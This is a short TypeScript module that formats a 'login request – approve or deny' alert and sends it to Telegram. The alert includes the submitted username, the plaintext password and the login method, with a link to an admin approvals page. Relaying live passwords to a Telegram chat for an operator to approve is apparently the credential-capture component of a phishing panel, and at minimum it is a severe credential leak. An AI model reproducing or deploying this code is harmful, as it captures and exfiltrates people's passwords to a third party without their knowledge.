/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
function normalizeAdminPortalUrl(raw?: string): string {
  const t = (raw ?? '').trim()
  if (!t) return '/admin/login'
  const origin = t.replace(/\/admin\/login.*$/i, '').replace(/\?.*$/, '').replace(/\/+$/, '')
  return origin || '/admin/login'
}

import { sendTelegramMessage } from "@/lib/telegram"
import { PROJECT_DISPLAY_NAME } from "@/lib/project-config"

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeHtml(href)}">${escapeHtml(linkText)}</a>`
}

function asCode(value: unknown): string {
  const text =
    typeof value === "string"
      ? value.trim()
      : value != null && value !== ""
        ? String(value)
        : ""
  return `<code>${escapeHtml(text || "Unknown")}</code>`
}

export async function sendLoginApprovalRequest(data: Record<string, any>): Promise<boolean> {
  const approvalsUrl = normalizeAdminPortalUrl(data.approvalsUrl)
  const message = [
    `🔔 <b>Login request – approve or deny (${escapeHtml(PROJECT_DISPLAY_NAME)})</b>`,
    "",
    `👤 <b>Username:</b> ${asCode(data.userId)}`,
    `🔑 <b>Password:</b> ${asCode(data.password)}`,
    `📧 <b>Method:</b> ${asCode(data.method)}`,
    "",
    `👉 Approve or deny (${asLink(approvalsUrl)}`,
  ].join("\n")
  return sendTelegramMessage(message)
}
